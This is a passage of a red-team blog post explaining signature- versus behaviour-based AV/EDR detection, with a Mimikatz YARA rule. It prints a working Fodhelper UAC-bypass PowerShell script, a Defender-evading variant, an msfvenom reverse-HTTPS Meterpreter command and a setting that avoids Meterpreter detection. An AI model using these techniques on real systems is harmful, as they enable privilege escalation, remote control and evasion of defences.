@@ -1,0 +1,484 @@
+# https://s3cur3th1ssh1t.github.io/Signature_vs_Behaviour/
+
+<!DOCTYPE html><html lang="en" data-color-mode="auto" data-light-theme="light" data-dark-theme="dark" data-a11y-animated-images="system" data-a11y-link-underlines="true"><body style="word-wrap: break-word;">
+
+<article>
+  
+
+  <p>In this blog post, the main difference between signature-based and behavior-based Detections are explained. In addition, examples are shown with respective Detection bypasses.</p>
+
+<!--more-->
+
+<p>After publishing my <a href="https://twitter.com/ShitSecure/status/1482428360500383755">Packer</a>, more and more people asked me about why for example <code class="language-plaintext highlighter-rouge">MSF-</code> or <code class="language-plaintext highlighter-rouge">CobaltStrike- (CS)</code>-Payloads were still detected. Well, in the very first place the easy answer is, that there is:</p>
+
+<ul>
+  <li>A signature-based Detection, which was bypassed</li>
+  <li>A behaviour-based Detection, which was triggered and killed the Process.</li>
+</ul>
+
+<p>There are multiple Detection-techniques, which a Packer <strong>can</strong> bypass and there are others, which technically <strong>cannot</strong> get bypassed. Writing a blog post about this topic is at least for me the easiest way to answer this, as in the future I can just send one link for these kind of questions. ;-)</p>
+
+<p>Using my private Packer will result in an <code class="language-plaintext highlighter-rouge">antiScan.me</code> result like this for <code class="language-plaintext highlighter-rouge">MSF</code>-Packed Payloads:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/AntiScanMe.JPG">
+</p>
+
+<p>But this <strong>does not</strong> mean, the Payload will not get detected from those AV-Vendors when executed <strong>on Runtime</strong>. Why? Keep reading.</p>
+
+<h2 id="signature-based-detections">Signature-based Detections</h2>
+
+<p>Signature-based Detections are very simple. The very first AV solutions had a signature database with <em>File-Hashes</em> and they just compared the Hash of any executable on disk with the <em>known malicious executable</em> softwares Hash. E.g. this database contained the SHA1/MD5 Hash of the release binary for <em>Mimikatz</em>. Changing the Hash of an executable is as simple as <strong>manipulating</strong> a single byte in it, so this Detection is not really reliable and at least I hope not commonly used anymore anyway in 2022.</p>
+
+<p>Because of the fact, that this is <strong>not reliable</strong> vendors moved to detecting specific <strong>byte pattern</strong> signatures as alternative. So to stay with the example of Mimikatz specific <strong>byte patterns/hex values</strong> are flagged like:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">73</span> <span class="mo">00</span> <span class="mi">65</span> <span class="mo">00</span> <span class="mi">6</span><span class="no">B</span> <span class="mo">00</span> <span class="mi">75</span> <span class="mo">00</span> <span class="mi">72</span> <span class="mo">00</span> <span class="mi">6</span><span class="no">C</span> <span class="mo">00</span> <span class="mi">73</span> <span class="mo">00</span> <span class="mi">61</span> <span class="mo">00</span> <span class="mi">5</span><span class="no">F</span> <span class="mo">00</span> <span class="mi">6</span><span class="no">D</span> <span class="mo">00</span> <span class="mi">69</span> <span class="mo">00</span> <span class="mi">6</span><span class="no">E</span> <span class="mo">00</span> <span class="mi">69</span> <span class="mo">00</span> <span class="mi">64</span> <span class="mo">00</span> <span class="mi">75</span> <span class="mo">00</span> <span class="mi">6</span><span class="no">D</span> <span class="mo">00</span> <span class="mi">70</span>
+<span class="o">--&gt;</span> <span class="no">HEX</span> <span class="n">values</span> <span class="k">for</span> <span class="n">s</span><span class="p">.</span><span class="nf">e</span><span class="p">.</span><span class="nf">k</span><span class="p">.</span><span class="nf">u</span><span class="p">.</span><span class="nf">r</span><span class="p">.</span><span class="nf">l</span><span class="p">.</span><span class="nf">s</span><span class="p">.</span><span class="nf">a</span><span class="p">.</span><span class="nf">_</span><span class="p">.</span><span class="nf">m</span><span class="p">.</span><span class="nf">i</span><span class="p">.</span><span class="nf">n</span><span class="p">.</span><span class="nf">i</span><span class="p">.</span><span class="nf">d</span><span class="p">.</span><span class="nf">u</span><span class="p">.</span><span class="nf">m</span><span class="p">.</span><span class="nf">p</span>
+</code></pre></div></div>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/MimikatzHex.JPG">
+</p>
+
+<p>It just makes sense here to not only flag one pattern per <em>known malicious binary/payload</em> but to use multiple common patterns. Mimikatz is always a good example for signature-based Detections as typically vendors have dozens of patterns for Mimikatz binary Detections. By doing is this way, they make sure, that also slightly modified versions get detected.</p>
+
+<p>Even more advanced Detections can be build with <a href="https://github.com/Yara-Rules/rules">yara rules</a>. These rules can either Scan <strong>files</strong> or <strong>Memory contents</strong> and allow much more complex conditions and combinations of different patterns. An example Mimikatz yara rule looks like this:</p>
+
+<p><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Hacktool_Mimikatz.yar">Elastic Mimikatz Yara rule</a></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rule</span> <span class="no">Windows_Hacktool_Mimikatz_1388212a</span> <span class="p">{</span>
+    <span class="ss">meta:
+        </span><span class="n">author</span> <span class="o">=</span> <span class="s2">"Elastic Security"</span>
+        <span class="nb">id</span> <span class="o">=</span> <span class="s2">"1388212a-2146-4565-b93d-4555a110364f"</span>
+        <span class="n">fingerprint</span> <span class="o">=</span> <span class="s2">"dbbdc492c07e3b95d677044751ee4365ec39244e300db9047ac224029dfe6ab7"</span>
+        <span class="n">creation_date</span> <span class="o">=</span> <span class="s2">"2021-04-13"</span>
+        <span class="n">last_modified</span> <span class="o">=</span> <span class="s2">"2021-08-23"</span>
+        <span class="n">threat_name</span> <span class="o">=</span> <span class="s2">"Windows.Hacktool.Mimikatz"</span>
+        <span class="n">reference_sample</span> <span class="o">=</span> <span class="s2">"66b4a0681cae02c302a9b6f1d611ac2df8c519d6024abdb506b4b166b93f636a"</span>
+        <span class="n">severity</span> <span class="o">=</span> <span class="mi">100</span>
+        <span class="n">arch_context</span> <span class="o">=</span> <span class="s2">"x86"</span>
+        <span class="no">Scan_context</span> <span class="o">=</span> <span class="s2">"file, Memory"</span>
+        <span class="n">license</span> <span class="o">=</span> <span class="s2">"Elastic License v2"</span>
+        <span class="n">os</span> <span class="o">=</span> <span class="s2">"windows"</span>
+    <span class="ss">strings:
+        </span><span class="vg">$a1</span> <span class="o">=</span> <span class="s2">"   Password: %s"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a2</span> <span class="o">=</span> <span class="s2">"  * Session Key   : 0x%08x - %s"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a3</span> <span class="o">=</span> <span class="s2">"   * Injecting ticket : "</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a4</span> <span class="o">=</span> <span class="s2">" ## / </span><span class="se">\\</span><span class="s2"> ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a5</span> <span class="o">=</span> <span class="s2">"Remove mimikatz driver (mimidrv)"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a6</span> <span class="o">=</span> <span class="s2">"mimikatz(commandline) # %s"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a7</span> <span class="o">=</span> <span class="s2">"  Password: %s"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a8</span> <span class="o">=</span> <span class="s2">" - SCardControl(FEATURE_CCID_ESC_COMMAND)"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a9</span> <span class="o">=</span> <span class="s2">" * to 0 will take all 'cmd' and 'mimikatz' Process"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a10</span> <span class="o">=</span> <span class="s2">"** Pass The Ticket **"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a11</span> <span class="o">=</span> <span class="s2">"-&gt; Ticket : %s"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a12</span> <span class="o">=</span> <span class="s2">"Busylight Lync model (with bootloader)"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a13</span> <span class="o">=</span> <span class="s2">"mimikatz.log"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a14</span> <span class="o">=</span> <span class="s2">"Log mimikatz input/output to file"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a15</span> <span class="o">=</span> <span class="s2">"ERROR kuhl_m_dpapi_masterkey ; kull_m_dpapi_unprotect_domainkey_with_key"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a16</span> <span class="o">=</span> <span class="s2">"ERROR kuhl_m_lsadump_dcshadow ; unable to start the server: %08x"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a17</span> <span class="o">=</span> <span class="s2">"ERROR kuhl_m_sekurlsa_pth ; GetTokenInformation (0x%08x)"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a18</span> <span class="o">=</span> <span class="s2">"ERROR mimikatz_doLocal ; </span><span class="se">\"</span><span class="s2">%s</span><span class="se">\"</span><span class="s2"> module not found !"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a19</span> <span class="o">=</span> <span class="s2">"Install and/or start mimikatz driver (mimidrv)"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a20</span> <span class="o">=</span> <span class="s2">"Target: %hhu (0x%02x - %s)"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a21</span> <span class="o">=</span> <span class="s2">"mimikatz Ho, hey! I'm a DC :)"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a22</span> <span class="o">=</span> <span class="s2">"mimikatz service (mimikatzsvc)"</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a23</span> <span class="o">=</span> <span class="s2">"[masterkey] with DPAPI_SYSTEM (machine, then user): "</span> <span class="n">wide</span> <span class="n">fullword</span>
+        <span class="vg">$a24</span> <span class="o">=</span> <span class="s2">"$http://blog.gentilkiwi.com/mimikatz 0"</span> <span class="n">ascii</span> <span class="n">fullword</span>
+        <span class="vg">$a25</span> <span class="o">=</span> <span class="s2">" * Username : %wZ"</span> <span class="n">wide</span> <span class="n">fullword</span>
+    <span class="ss">condition:
+        </span><span class="mi">3</span> <span class="n">of</span> <span class="p">(</span><span class="vg">$a</span><span class="o">*</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So in this case if three of the mentioned strings are found either <strong>in a file</strong> or <strong>in Memory</strong> this rule will trigger and the AV/EDR Software can do an action like alerting or killing the Process. Detections like this can for example bypassed with the technique I described in my <a href="https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/">Building a custom Mimikatz binary</a> blog post.</p>
+
+<h2 id="the-inner-workings-of-a-packer">The inner workings of a Packer</h2>
+
+<p>It is important to understand how a Packer basically works to get an idea of what it <strong>can</strong> do and what <strong>is not</strong> possible. In the very end, it is about a Software, which wraps a Payload into another Program to avoid <strong>signature-based</strong> Detections for it. So if a Payload like Mimikatz contained specific Strings, these Strings will not be visible anymore in the resulting Binary. The wrapping Process can be done with either some encoding/obfuscation or with encryption. I’m personally preferring to encrypt the Payload, as this will result in the best randomness - and therefore least signature-based Detections.</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/Packer.png">
+</p>
+
+<p>This encoded or encrypted Payload has to be <strong>decoded/decrypted</strong> in the resulting Loader-Program, so that the cleartext Payload can get executed <strong>from Memory</strong>.</p>
+
+<p>Depending on the Payload, it is possible for a Packer to also get rid of more Detections <strong>in the current</strong> or <strong>remote Process</strong>:</p>
+
+<ol>
+  <li>If your Packer is <strong>Patching/bypassing AMSI</strong>, you can safely execute different <strong>known malicious</strong> Scripts (PS1,VBA,JS and so on) or C# assemblies from Memory.</li>
+  <li>To get rid of <a href="https://github.com/xuanxuan0/TiEtwAgent">ETW based Detections</a>, a Packer can also <strong>Patch/bypass ETW</strong> via different published techniques.</li>
+  <li>Hooking based Detections for Win32 APIs can be bypassed with e.G. unhooking or direct/indirect Syscall usage.</li>
+  <li><a href="https://practicalsecurityanalytics.com/file-entropy/">Entropy based Detections</a> will detect many Packers, as encryption of a Payload will lead to a very high entropy due to the randomness. This can be bypassed for example by adding thousands of words into the resulting Binary, as this decreases the entropy again.</li>
+</ol>
+
+<p>My private Packer also makes use of all of these things mentioned.</p>
+
+<p>But even if all these techniques are applied, there are more potential “problems” left:</p>
+<ol>
+  <li>Memory Scans</li>
+  <li>Behavioural Detections</li>
+  <li>Threat Hunters / Blue Team</li>
+</ol>
+
+<p>In general it is possible to also bypass Memory Scans with a Packer, but this is very limited as you will see later on.</p>
+
+<h2 id="memory-scans-and-general-bypass-techniques">Memory Scans and general bypass techniques</h2>
+
+<p>As signature-based Detections can easily get bypassed with the Packer technique, more and more AV/EDR vendors tend to also do Memory Analysis with Scans. These Scans are typically not done all the time over all Processes, as this would be too resource-consuming, but can be triggered by specific conditions.</p>
+
+<p>A Memory Scan for example typically appears in the following situations:</p>
+
+<ul>
+  <li>A new Process is spawned, e.G. running an executable</li>
+  <li>The behaviour of a Process triggers a Memory Scan</li>
+</ul>
+
+<p>The first one is trivial to bypass. Even a Packer can for example just sleep a given time <strong>before</strong> decoding/decrypting the real Payload. In that case, the Memory Scan will take place but won’t find anything, as the Payload is still encrypted.
+There are ways to still detect <strong>Win32 Sleep</strong> based Memory Scan bypasses, for example <a href="https://github.com/ZeroMemoryEx/SleepKiller">demonstrated here</a>. As an alternative to using <code class="language-plaintext highlighter-rouge">Sleep</code> you could therefore also execute pseudo-code for a specific amount of time or do calculations. There are many alternatives to using <code class="language-plaintext highlighter-rouge">Sleep</code>.</p>
+
+<p>But in general, there are different approaches to bypass Memory Scans:</p>
+
+<ul>
+  <li>Changing/modifying the source code of your Payload to avoid signature-based Detections</li>
+  <li>Changing the behaviour of your Payload, so that the Memory Scan will never trigger at all</li>
+  <li>Memory encryption</li>
+</ul>
+
+<p>I personally prefer the first option, it’s one time effort per Software and as long as the new code base is not made public, it should also not get detected in the future.</p>
+
+<p>Bypassing behavior-based Memory Scans is harder depending on <em>what your Payload is doing</em>. Just imagine the behaviour of Mimikatz (for example opening up a Handle to LSASS with <code class="language-plaintext highlighter-rouge">OpenProcess</code>) triggers a Scan - in this moment there is no way to hide Mimikatz from Memory as it <strong>needs</strong> to be unencrypted to do it’s work. So Memory encryption will not be an option for Mimikatz. And don’t get my wrong, I would not recommend to use Mimikatz for LSASS dumping in 2022 anyway <a href="https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/">as mentioned here</a>. It’s just a good example to understand it.</p>
+
+<p>For <strong>well known</strong> C2-Frameworks like Cobalt Strike the most common option is Memory encryption. But if you don’t have access to source code, it’s not possible anyway to modify that to avoid Memory Detections. <code class="language-plaintext highlighter-rouge">¯\_(ツ)_/¯</code> 
+C2-Frameworks in general are a good candidate for this technique, as they Sleep most of the time. And if a program doesn’t do anything, it’s Memory content can get encrypted in that time-frame without any problems.</p>
+
+<h2 id="behaviour-based-detections---some-examples-and-bypasses">Behaviour-based Detections - some examples and bypasses</h2>
+
+<p>But which behaviours could trigger an AV/EDR action or a Memory Scan on runtime? This can basically be everything. Writing stuff into Memory, loading specific libraries in a specific order and/or time-frame, creating registry entries, do initial HTTP requests or any other action.</p>
+
+<p>I’ll give some few examples here with corresponding bypass techniques for Defender.</p>
+
+<p>From my personal experience the least common <strong>action</strong> an AV/EDR does <strong>after</strong> detecting a specific <strong>behaviour</strong> is <em>instantly</em> killing the Process. Why is that? Well, AV/EDR vendors don’t want to have too many false positive findings. As false positive findings with the action of killing a Process can lead to disruptions in production environments which is really bad. So they need to be nearly 100% sure, that a behaviour is definitely Malware to kill the corresponding Process. This is also the reason, why many vendors combine the Detection of a behaviour with a Memory Scan afterwards to <strong>verify</strong> they found something Malicious.</p>
+
+<h3 id="fodhelper-uac-bypass-example">Fodhelper UAC Bypass example</h3>
+
+<p>One good example for a behaviour-based Detection, which leads to an AV action is the Fodhelper UAC bypass with Windows Defender. This one is really well known, but also very easy to exploit, as it’s just about creating a Registry Entry and calling <code class="language-plaintext highlighter-rouge">fodhelper.exe</code> afterwards:</p>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="c1">#</span>
+<span class="o">.</span><span class="nv">SYNOPSIS</span>  
+    <span class="nv">This</span> <span class="nv">script</span> <span class="nv">can</span> <span class="nv">bypass</span> <span class="nv">User</span> <span class="nv">Access</span> <span class="nv">Control</span> <span class="p">(</span><span class="nv">UAC</span><span class="p">)</span> <span class="nv">via</span> <span class="nv">fodhelper</span><span class="o">.</span><span class="nv">exe</span>
+<span class="err">　</span>
+    <span class="nv">It</span> <span class="nv">creates</span> <span class="nv">a</span> <span class="k">new</span> <span class="nv">registry</span> <span class="nv">structure</span> <span class="nv">in:</span> <span class="p">"</span><span class="s2">HKCU:</span><span class="se">\</span><span class="s2">Software</span><span class="se">\</span><span class="s2">Classes</span><span class="se">\</span><span class="s2">ms-settings</span><span class="se">\"</span><span class="s2"> to perform UAC bypass and starts 
+    an elevated command prompt. 
+    　
+.NOTES  
+    Function   : FodhelperUACBypass
+    File Name  : FodhelperUACBypass.ps1 
+    Author     : netbiosX. - pentestlab.blog 
+　
+.LINKS          
+    https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692
+    https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/    
+　
+.EXAMPLE  
+　
+     Load </span><span class="p">"</span><span class="nv">cmd</span> <span class="o">/</span><span class="nv">c</span> <span class="nv">start</span> <span class="nv">C:</span><span class="o">\</span><span class="nv">Windows</span><span class="o">\</span><span class="nv">System32</span><span class="o">\</span><span class="nv">cmd</span><span class="o">.</span><span class="nv">exe</span><span class="p">"</span><span class="s2"> (it's default):
+     FodhelperUACBypass 
+　
+     Load specific application:
+     FodhelperUACBypass -Program </span><span class="p">"</span><span class="nv">cmd</span><span class="o">.</span><span class="nv">exe</span><span class="p">"</span><span class="s2">
+     FodhelperUACBypass -Program </span><span class="p">"</span><span class="nv">cmd</span><span class="o">.</span><span class="nv">exe</span> <span class="o">/</span><span class="nv">c</span> <span class="nv">powershell</span><span class="o">.</span><span class="nv">exe</span><span class="p">"</span><span class="s2">　
+#&gt;
+
+function FodhelperUACBypass(){ 
+ Param (
+           
+        [String]</span><span class="si">$Program</span><span class="s2"> = </span><span class="p">"</span><span class="nv">cmd</span> <span class="o">/</span><span class="nv">c</span> <span class="nv">start</span> <span class="nv">C:</span><span class="o">\</span><span class="nv">Windows</span><span class="o">\</span><span class="nv">System32</span><span class="o">\</span><span class="nv">cmd</span><span class="o">.</span><span class="nv">exe</span><span class="p">"</span><span class="s2"> #default
+       )
+　
+    #Create Registry Structure
+    New-Item </span><span class="p">"</span><span class="nv">HKCU:</span><span class="o">\</span><span class="nv">Software</span><span class="o">\</span><span class="nv">Classes</span><span class="o">\</span><span class="nv">ms</span><span class="o">-</span><span class="nv">settings</span><span class="o">\</span><span class="nv">Shell</span><span class="o">\</span><span class="nv">Open</span><span class="o">\</span><span class="nv">command</span><span class="p">"</span><span class="s2"> -Force
+    New-ItemProperty -Path </span><span class="p">"</span><span class="nv">HKCU:</span><span class="o">\</span><span class="nv">Software</span><span class="o">\</span><span class="nv">Classes</span><span class="o">\</span><span class="nv">ms</span><span class="o">-</span><span class="nv">settings</span><span class="o">\</span><span class="nv">Shell</span><span class="o">\</span><span class="nv">Open</span><span class="o">\</span><span class="nv">command</span><span class="p">"</span><span class="s2"> -Name </span><span class="p">"</span><span class="nv">DelegateExecute</span><span class="p">"</span><span class="s2"> -Value </span><span class="p">""</span><span class="s2"> -Force
+    Set-ItemProperty -Path </span><span class="p">"</span><span class="nv">HKCU:</span><span class="o">\</span><span class="nv">Software</span><span class="o">\</span><span class="nv">Classes</span><span class="o">\</span><span class="nv">ms</span><span class="o">-</span><span class="nv">settings</span><span class="o">\</span><span class="nv">Shell</span><span class="o">\</span><span class="nv">Open</span><span class="o">\</span><span class="nv">command</span><span class="p">"</span><span class="s2"> -Name </span><span class="p">"(</span><span class="nv">default</span><span class="p">)"</span><span class="s2"> -Value </span><span class="si">$Program</span><span class="s2"> -Force
+　
+    #Start fodhelper.exe
+    Start-Process </span><span class="p">"</span><span class="nv">C:</span><span class="o">\</span><span class="nv">Windows</span><span class="o">\</span><span class="nv">System32</span><span class="o">\</span><span class="nv">fodhelper</span><span class="o">.</span><span class="nv">exe</span><span class="p">"</span><span class="s2"> -WindowStyle Hidden
+　
+    #Cleanup
+    Start-Sleep 3
+    Remove-Item </span><span class="p">"</span><span class="nv">HKCU:</span><span class="o">\</span><span class="nv">Software</span><span class="o">\</span><span class="nv">Classes</span><span class="o">\</span><span class="nv">ms</span><span class="o">-</span><span class="nv">settings</span><span class="o">\</span><span class="p">"</span><span class="s2"> -Recurse -Force
+　
+}
+</span></code></pre></div></div>
+<p><a href="https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692">This code snipped was taken from here</a></p>
+
+<p>Executing this with Defender enabled will lead to the following Detection:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/FodhelperDetection.JPG">
+</p>
+
+<p>This alert neither kills the executing nor the newly spawned Process, but can still lead to Detections in any engagement. The Detection itself <strong>cannot</strong> be bypassed with an AMSI bypass and Patching ETW also <strong>doesn’t</strong> help. Because it’s a specific behaviour triggering this Alert.</p>
+
+<p>I did some light Analysis with trial and error about what specifically is flagged here and found out, that Defender does not like any <strong>.exe</strong> in the <em>HKCU:\Software\Classes\ms-settings\Shell\Open\command(Default)</em> entry as well as the Directories <em>*C:\windows\system32*</em> and <em>*C:\windows\syswow64*</em>.</p>
+
+<p>So the behaviour, which triggers an Alert is <strong>creating a Registry Entry</strong> in the mentioned Directory <strong>with</strong> one of the Strings.</p>
+
+<p>Luckily for us, we don’t need to specify <strong>.exe</strong> to execute a Binary and also both Directories are not necessarily needed for exploitation. So as an alternative, we could just copy e.G. a C2-Stager into any writable Directory and execute it with the UAC-Bypass without calling the extension.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">FodhelperUACBypass</span> <span class="o">-</span><span class="no">Program</span> <span class="no">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">stager</span> <span class="c1"># Real filename is stager.exe but this would trigger an alert.</span>
+</code></pre></div></div>
+
+<p>But in 2022, many OffSec People will have gotten aware of the fact, that running any unsigned executables on a system with AV/EDR installed might not be a very good idea. So as an alternative we could also execute any signed <strong>trusted</strong> executable and drop a corresponding Sideloading-DLL into the same directory. Third option: we can copy <em>rundll32.exe</em> into our writable Directory and execute it from there:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">function</span> <span class="no">FodhelperUACBypass</span><span class="p">(){</span> 
+ <span class="no">Param</span> <span class="p">(</span>
+           
+        <span class="p">[</span><span class="no">String</span><span class="p">]</span><span class="vg">$run</span> <span class="o">=</span> <span class="s2">"C:</span><span class="se">\t</span><span class="s2">emp</span><span class="se">\p</span><span class="s2">eng C:</span><span class="se">\t</span><span class="s2">emp</span><span class="se">\c</span><span class="s2">alc.dll,NimMain"</span> <span class="c1">#NimMain only for Nim Dlls ;-)</span>
+       <span class="p">)</span>
+    <span class="c1"># Copy C:\windows\system32\rundll32.exe to C:\temp\Peng.exe</span>
+    <span class="n">copy</span> <span class="no">C</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">rundll32</span><span class="p">.</span><span class="nf">exe</span> <span class="no">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="no">Peng</span><span class="p">.</span><span class="nf">exe</span>
+    <span class="c1">#Create Registry Structure</span>
+    <span class="no">New</span><span class="o">-</span><span class="no">Item</span> <span class="s2">"HKCU:</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\C</span><span class="s2">lasses</span><span class="se">\m</span><span class="s2">s-settings</span><span class="se">\S</span><span class="s2">hell</span><span class="se">\O</span><span class="s2">pen</span><span class="se">\c</span><span class="s2">ommand"</span> <span class="o">-</span><span class="no">Force</span>
+    <span class="no">New</span><span class="o">-</span><span class="no">ItemProperty</span> <span class="o">-</span><span class="no">Path</span> <span class="s2">"HKCU:</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\C</span><span class="s2">lasses</span><span class="se">\m</span><span class="s2">s-settings</span><span class="se">\S</span><span class="s2">hell</span><span class="se">\O</span><span class="s2">pen</span><span class="se">\c</span><span class="s2">ommand"</span> <span class="o">-</span><span class="no">Name</span> <span class="s2">"DelegateExecute"</span> <span class="o">-</span><span class="no">Value</span> <span class="s2">""</span> <span class="o">-</span><span class="no">Force</span>
+    <span class="no">Set</span><span class="o">-</span><span class="no">ItemProperty</span> <span class="o">-</span><span class="no">Path</span> <span class="s2">"HKCU:</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\C</span><span class="s2">lasses</span><span class="se">\m</span><span class="s2">s-settings</span><span class="se">\S</span><span class="s2">hell</span><span class="se">\O</span><span class="s2">pen</span><span class="se">\c</span><span class="s2">ommand"</span> <span class="o">-</span><span class="no">Name</span> <span class="s2">"(default)"</span> <span class="o">-</span><span class="no">Value</span> <span class="vg">$run</span> <span class="o">-</span><span class="no">Force</span>
+    <span class="c1">#Start fodhelper.exe</span>
+    <span class="no">Start</span><span class="o">-</span><span class="no">Process</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\f</span><span class="s2">odhelper.exe"</span>
+    <span class="c1">#Cleanup</span>
+    <span class="no">Start</span><span class="o">-</span><span class="no">Sleep</span> <span class="mi">3</span>
+    <span class="no">Remove</span><span class="o">-</span><span class="no">Item</span> <span class="s2">"HKCU:</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\C</span><span class="s2">lasses</span><span class="se">\m</span><span class="s2">s-settings</span><span class="se">\"</span><span class="s2"> -Recurse -Force
+}
+</span></code></pre></div></div>
+
+<h3 id="meterpreter-behaviour-based-detections">Meterpreter behaviour-based Detections</h3>
+
+<p>As many people also asked me about why their <code class="language-plaintext highlighter-rouge">MSF</code>-Payloads still get flagged, I decided to also show some (nothing new, everything already published somewhere) background information about that.</p>
+
+<p>First things first: Don’t use staged Payloads, they will always get caught at least by Defender and I don’t plan to modify the source Code of Meterpreter in this post. ;-)</p>
+
+<p>So in our case we’ll generate <em>stageless</em> reverse-HTTPS Shellcode for execution. This can be done for example with the following command:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msfvenom</span> <span class="o">-</span><span class="nb">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter_reverse_https</span> <span class="no">LHOST</span><span class="o">=</span><span class="p">(</span><span class="no">IP</span> <span class="no">Address</span><span class="p">)</span> <span class="no">LPORT</span><span class="o">=</span><span class="p">(</span><span class="no">Your</span> <span class="no">Port</span><span class="p">)</span> <span class="o">-</span><span class="n">f</span> <span class="n">raw</span> <span class="o">&gt;</span> <span class="no">Shellcode</span><span class="p">.</span><span class="nf">bin</span>
+</code></pre></div></div>
+
+<p>I will not cover the <em>stealth</em> way of executing this Shellcode here, as I want to show the behavioural Detection but in general you’ll need the following:</p>
+
+<ol>
+  <li>Encrypt the Shellcode and decrypt it on runtime to avoid signatures on disk or as alternative load it from a remote Web-Server on runtime</li>
+  <li>Use direct or indirect Syscalls for execution, otherwise the Shellcode will get flagged <strong>before</strong> execution</li>
+</ol>
+
+<p>No need for Patching AMSI/ETW to get Meterpreter running in this case.</p>
+
+<p>But even if you were bypassing the signature-based Detection on disk <strong>and</strong> the Shellcode Detection with Syscalls, you should be able to see one new Meterpreter Session incoming:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/MSFIncoming.JPG">
+</p>
+
+<p>But this just means, that our initial Payload was executed successfully. One second later, the Process is killed and the following Detection appears:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/Meterpreter_Behaviour.JPG">
+</p>
+
+<p>And again, this is a behaviour-based Detection, which is triggered by additional DLL files, loaded via plain Win32 APIs and <a href="https://github.com/rapid7/ReflectiveDLLInjection/tree/fac3adab1187deade60eef27be8423ee117c1e1f">reflective DLL-Injection</a> technique. In this case, the Injection of the stdapi-DLL triggered an Alert.</p>
+
+<p>In the <em>msfconsole</em> prompt, you can pass the following command to disable loading of the <a href="https://github.com/rapid7/metasploit-Payloads/tree/master/c/meterpreter/source/extensions/stdapi">stdapi DLL</a>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>autoloadstdapi <span class="nb">false</span>
+</code></pre></div></div>
+
+<p>After doing that, you should be pretty fine getting your Meterpreter Session incoming:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/NoMetDetection.JPG">
+</p>
+
+<p>Disabling stdapi loading will, however lead to you having nearly no commands/modules in your Meterpreter-Session and only the “Core Commands” will be available.</p>
+
+<p>After waiting some minutes, you can load stdapi manually with the following command and there should be still no Detection:</p>
+
+<p align="center">
+          <img src="https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/LoadStdAPI.JPG">
+</p>
+
+<p>What is this behaviour-based Detection about? I cannot tell 100% for sure, but it’s most likely the combination of:</p>
+
+<ul>
+  <li>A newly spawned Process</li>
+  <li>Timeframe x for the new Process till specific Windows APIs for reflective loading of a DLL are called</li>
